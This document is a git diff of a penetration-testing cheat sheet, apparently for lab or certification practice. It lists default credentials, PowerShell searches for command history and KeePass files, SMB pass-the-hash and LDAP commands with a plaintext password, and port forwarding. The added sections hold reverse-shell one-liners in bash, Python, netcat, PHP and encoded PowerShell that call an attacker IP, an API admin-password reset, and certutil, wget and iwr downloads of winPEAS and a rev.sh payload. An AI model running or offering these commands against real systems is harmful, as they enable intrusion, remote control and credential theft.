@@ -1,4 +1,5 @@
 # Default Credentials
+```bash
 admin:admin
 admin:password
 admin:null
@@ -6,17 +7,18 @@ root:root
 root:password
 root:null
 platform:platform
+```
 
 # Windows juicy files 
 ```bash
-type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-Get-History
-(Get-PSReadlineOption).HistorySavePath
+> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+> type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+> Get-History
+> (Get-PSReadlineOption).HistorySavePath
 
-Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 
 ```
 
@@ -31,12 +33,12 @@ gobuster dir -u http://192.168.216.122/ -w /usr/share/wordlists/dirbuster/direct
 
 ## feroxbuster (must add -x 
 ```bash
-└─# feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.216.10/ -x php,aspx,jsp,pdf -C 404,401,403 
+└─# feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.216.10/ -x php,aspx,jsp,pdf -C 404,401,403 -k
 ```
 
 
 
-## nikto: find webdav
+## nikto: find webdav, other vuln
 ```bash
 nikto -h http://192.168.222.122
 ```
@@ -72,6 +74,19 @@ put /root/offsec/shell.aspx
 crackmapexec smb 192.168.216.165 -u 'enox' -p '' --shares
 ```
 
+## smbclient
+```bash
+smbclient \\\\192.168.161.31\\share -U 'Administrator' -N
+smbclient \\\\192.168.50.212\\share -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+```
+
+## smbserver
+```bash
+sudo smbserver.py -smb2support share $(pwd) 
+sudo smbserver.py -smb2support share $(pwd) -user kali -password kali
+
+```
+
 
 # PORT 389,3268: LDAP
 ## ldapsearch: focus on samaccount and description
@@ -88,6 +103,87 @@ ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJell
 ```bash
 snmpwalk -c public -v1 192.168.x.x
 snmpwalk -v2c -c public 192.168.195.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
+```
+
+
+## socat
+```bash
+sudo socat tcp-listen:135,reuseaddr,fork tcp:<victim.ip.add.ress>:9999
+```
+
+
+## NMAP
+```bash
+sudo nmap -A -p- -T4 192.168.245.145
+sudo nmap -sU --open --top-ports 20 -sV 192.168.245.149
+
+```
+
+## Reverse shell
+```bash
+# bash
+bash -i >& /dev/tcp/192.168.45.176/80 0>&1
+bash -c 'bash -i >& /dev/tcp/192.168.45.176/80 0>&1'
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.176%2F80%200%3E%261%22
+echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/192.168.45.176/80 0>&1"' | base64
+
+# python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.176",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.176",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+#netcat reverse shell
+nc -e /bin/sh 192.168.45.176 80
+
+#PHP reverse shell
+php -r '$sock=fsockopen("192.168.45.176",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+#Powershell: Create powershell reverse shell on kali linux
+$ kali@kali:~$ pwsh
+
+PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+PS> $EncodedText =[Convert]::ToBase64String($Bytes)
+PS> $EncodedText
+
+$powershell -enc $EncodedText
+
+```
+
+## curl
+```bash
+# GET Request
+curl -i http://192.168.50.16:5002/users/v1/admin/password
+
+# POST Request
+curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+
+# PUT Request
+curl -X 'PUT' \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+  -d '{"password": "pwned"}'
+```
+
+## File Download(When not working, make sure to use 80 and also try it without http://)
+```bash
+#certutil
+certutil -urlcache -split -f http://192.168.45.176:8000/winPEAS.exe c:/users/public/winPEAS.exe
+
+#wget
+wget http://192.168.45.176:8000/rev.sh
+wget -P /tmp/rev.sh http://192.168.45.176:8000/rev.sh
+
+
+#powershell
+iwr -uri http://192.168.45.176:8000/winPEAS.exe -outfile c:/users/public/winPEAS.exe
+
+#curl
+curl http://192.168.45.176/<FILE> > <OUTPUT_FILE>
+
 ```
 
 
